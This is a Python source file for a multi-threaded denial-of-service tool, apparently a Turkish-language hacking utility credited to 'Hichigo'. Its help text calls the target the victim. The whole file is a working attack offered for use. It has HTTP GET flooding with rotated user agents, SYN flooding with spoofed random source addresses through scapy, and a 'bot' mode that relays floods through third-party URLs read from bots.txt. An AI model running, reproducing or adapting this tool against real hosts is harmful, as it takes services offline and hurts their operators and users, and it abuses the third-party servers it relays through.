import socket
import os
import threading
import time
import sys
import random
import urllib.request
from scapy.all import *

def GETAttack(target,port,userAgents):
    while (True):
        try:
            data = b"""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive"""
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + (target).encode('utf-8') + b"\r\n\r\n User-Agent: "
            + random.choice(userAgents).encode('utf-8') + b"\r\n\r\n" + data)
            if (s.recv(4048)):
                print("[+] GET İsteği Gönderildi!")
            else:
                print("[-] GET İsteği Gönderilemedi!")
            s.close()
            time.sleep(0.009)
        except Exception as e:
            print(e)
            print("[-] GET İsteği Gönderilemedi!")

def SYNAttack(target,port):
    while (True):
        try:
            networkLayer = IP(src=".".join(map(str, (random.randint(0,255)for _ in range(4))))
            , dst=target)
            transportLayer = TCP(sport=random.randint(1000,9000),dport=port,flags="S")
            send(networkLayer/transportLayer, verbose=False)
            print("[+] SYN Paketi Gönderildi!")
            time.sleep(0.009)
        except:
            print("[-] SYN Paketi Gönderilirken Bir Hata Oluştu!")


def BOTAttack(host,userAgents):
    bots = []
    file = open("bots.txt","r")
    for i in file.readlines():
        bots.append(i)
    file.close()
    while True:
        try:
            url = random.choice(bots).replace('\n','') + host
            response = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(userAgents)}))
            if (response.read()):
                print ("[+] BOT Saldırısı Başarılı!")
            else:
                print ("[-] BOT Saldırısı Başararısız!")
            time.sleep(0.09)
        except:
            print ("[-] BOT Saldırısı Başararısız!")



def GenerateThreads(get,syn,bot,threadNumber,host,port):
    if (get == True):
        for k in range(0,threadNumber):
            try:
                t = threading.Thread(target=GETAttack, args=[host,port,userAgents])
                t.start()
                print ("[+] " + str(k+1) + ". GET Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". GET Çekirdeği Açılırken Bir Hata Oluştu!")

    if (bot == True):
        for k in range(0,threadNumber):
            try:
                a = threading.Thread(target=BOTAttack, args=[host,userAgents])
                a.start()
                print ("[+] " + str(k+1) + ". BOT Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". BOT Çekirdeği Açılırken Bir Hata Oluştu!")


    if (syn == True):
        for k in range(0,threadNumber):
            try:
                b = threading.Thread(target=SYNAttack, args=[host,port])
                b.start()
                print ("[+] " + str(k+1) + ". SYN Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". SYN Çekirdeği Açılırken Bir Hata Oluştu!")

def UserAgents():
    userAgents = []
    userAgents.append("""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14""")
    userAgents.append("""Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0""")
    userAgents.append("""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)""")
    userAgents.append("""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1""")
    return userAgents

def ShowHelp():
    print ("Kullanım: d.py [--kurban IP] [--port PORT] [--thread ÇEKİRDEK]\n")
    print ("  Parametreler:")
    print ("    --kurban veya -k: Saldırıyı yapacağınız kişinin IP adresi")
    print ("    --port veya -p: Kurbana saldıracağınız PORT numarası")
    print ("    --thread veya -t: Her saldırı başına oluşturulacak çekirdek sayısı")
    print ("    --syn veya -s: SYN Taşma Saldırısını metodunu aktive eder.")
    print ("    --get veya -g: GET Saldırı metodunu aktive eder. Varsayılan saldırı tipidir.")
    print ("    --bot veya -b: GET Saldırıları için BOT'ları aktive eder.")
    print ("    --yardım veya -y: Yardım menüsünü gösterir.\n")
    print ("  Örnekler:")
    print ("    SYN Taşma Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --syn")
    print ("    GET Taşma Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --get")
    print ("    BOT Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot")
    print ("    Karışık:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot --syn --get")

def ParseArg():
    threadNumber = 0
    syn = False
    get = False
    bot = False
    port = 0
    host = "NONE"

    if (len(sys.argv) < 2 or "-y" in sys.argv or "--yardım" in sys.argv):
        ShowHelp()
        exit()
    for i in range(1,len(sys.argv)):
        if (sys.argv[i] == '--kurban' or sys.argv[i] == '-k'):
            if (sys.argv[i+1]):
                host = sys.argv[i+1]
            else:
                print("[-] Kurban bulunamadı!")
                exit()

        if (sys.argv[i] == '--port' or sys.argv[i] == '-p'):
            if (sys.argv[i+1] and sys.argv[i+1].isdigit()):
                port = int(sys.argv[i+1])
            else:
                print("[-] Port bulunamadı!")
                exit()

        if (sys.argv[i] == '--thread' or sys.argv[i] == '-t'):
            if (sys.argv[i+1] and sys.argv[i+1].isdigit()):
                threadNumber = int(sys.argv[i+1])
            else:
                print("[-] Çekirdek sayısı bulunamadı!")
                exit()

        if (sys.argv[i] == '--syn' or sys.argv[i] == '-s'):
            syn = True
        if (sys.argv[i] == '--get' or sys.argv[i] == '-g'):
            get = True
        if (sys.argv[i] == '--bot' or sys.argv[i] == '-b'):
            bot = True

    banner = """
     ______         _______  __   __
    |      |       |       ||  | |  |
    |  _    |      |    _  ||  |_|  |
    | | |   |      |   |_| ||       |
    | |_|   | ___  |    ___||_     _|
    |       ||   | |   |      |   |
    |______| |___| |___|      |___| v1

    """

    print (banner)
    print ("Yapımcı: Hichigo | İnternetiniz hızlıysa daha iyi sonuç alabilirsiniz!\n")

    if (host == "NONE"):
        print ("[-] Kurban bulunamadı! Yardım menüsü için --yardım yazınız!")
        exit()

    if (port == 0):
        print ("[-] Port bulunamadı! Yardım menüsü için --yardım yazınız!")
        exit()

    if(bot == False and syn == False and bot == False):
        print ("[?] Saldırı metodu belirlenmemiş. GET Metodu kullanılıyor!")
        get = True

    if (threadNumber == 0):
        print ("[?] Çekirdek sayısı belirlenmemiş. Her methoda 1 çekirdek açılıyor!")
        threadNumber = 1

    return [host,port,threadNumber,get,syn,bot]


if __name__ == '__main__':
    if (os.getuid() != 0):
        print ("[-] Lütfen programı admin veya root olarak açınız!")
        exit()
    userAgents = UserAgents()
    host,port,threadNumber,get,syn,bot = ParseArg()
    #SYNAttack(host,port)
    #GETAttack(host,port,userAgents)
    #BOTAttack(host,userAgents)

    GenerateThreads(get,syn,bot,threadNumber,host,port)
